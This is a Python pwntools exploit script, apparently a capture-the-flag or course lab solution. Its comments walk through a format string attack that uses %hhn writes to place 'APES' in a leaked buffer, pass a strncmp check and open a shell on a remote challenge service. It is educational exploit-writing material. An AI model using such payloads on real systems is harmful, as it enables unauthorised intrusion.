#!/usr/bin/env python3
from pwn import *

# Before creating the script:

# The program gives you the address of a buffer that currently holds the value '9447',
# as well as another buffer than we can input a format string into. So we want to use
# this to alter the value stored in the buffer such that it passes a call to strncmp
# and then takes us to the win function.

# To first determine the position of our buffer we are writing into, I inputted:
# ABBBB %x %x %x %x 
# which gave the following output:
# ABBBB 41000000 42424242 20782520 25207825

# As seen above, we added added an 'A' to the start of the payload so that our input
# 'BBBB' is aligned properly. After this, we can see it is in the second 4 byte
# segment, so using %2$n writes to this.

# Hence, if our payload consists of a single 'A', followed by the other buffer address
# and then '%2$n', it overwrites the other buffer with the value 5, as this is the 
# length of our payload before the '%2$n' (being 1 byte for 'A' + 4 bytes for address).

# Now, instead of loading 5 into the other buffer, we want to load APES, as using
# binary ninja shows strncmp is called on our buffer and the string 'APES'. To do
# this, we will construct our payload one character at a time (or one byte at a time).

# For 'A', we can use 'man ascii' in the terminal to view an ascii table and see that
# the character 'A' corresponds to the value 65. Hence, since we already have 5 bytes
# loaded in, we want to add 65 - 5 = 60 bytes to this first address. Since this is
# only the first byte, we want to use '%2hhn' to only write a single byte.

# For 'P', the corresponding decimal value is 80. Hence, we update the payload by
# adding the address 1 byte after the start of the buffer (and make sure to update
# the previous %60x input to be 4 less because of adding this new address, making
# it 56 now), then adding 15 bytes and writing to the third 4 byte segment
# on the stack (which is the second byte of the buffer)

# If we want to write our third character 'E', we now have a problem, as the
# decimal value for this is 69, but we have already written 80 bytes. However, this
# can easily be solved as if we write over 255 bytes, it will simply overflow back
# to 0. Hence, if 'E' has decimal value 69, then we want to add 256 - 80 + 69 = 245.
# So, like before we add the third address to the start of the payload (subtracting 4 
# from %56x again to make it %52x), and then add %245x bytes and writing to the fourth
# 4 byte segment on the stack.

# For the final character 'S', this has decimal value 83, so we want to add the 
# address offset to the payload, update the %52x to be 4 less (%48x), and then add
# 83 - 69 = 14 bytes with %14x, writing this to the fifth 4 byte segment on the stack.

# Once this payload is constructed, I can send it as input into the function, which
# passess the strncmp call and enters the win function, giving me shell access.

# The script:

p = remote("plsdonthaq.me", 4001)

# First we extract the address of the buffer given to us
p.recvuntil("blocked the way at ")
landslide = int(p.recvline()[:-1], 0)

# Here we construct the format string payload. It begins with a single 'A' character
# to align our buffer to a 4 byte interval. Then, we add 4 addresses into the buffer,
# which we will end up writing to as our buffer will be the next thing on the stack.
# Then for each character we simply find the decimal value and each this many bytes
# to our payload, and then call %n to write however many bytes we've already printed
# to the next address on the stack.
format_str = (
	b"A" + 
  p32(landslide) + p32(landslide + 1) + p32(landslide + 2) + p32(landslide + 3) +
  b"%48x" + b"%2$hhn" + 
  b"%15x" + b"%3$hhn" +
  b"%245x" + b"%4$hhn" +
  b"%14x" + b"%5$hhn"
)

# We then send this format string as input
p.sendline(format_str)

# Now we should have shell access, so we can retrieve the flag
p.interactive()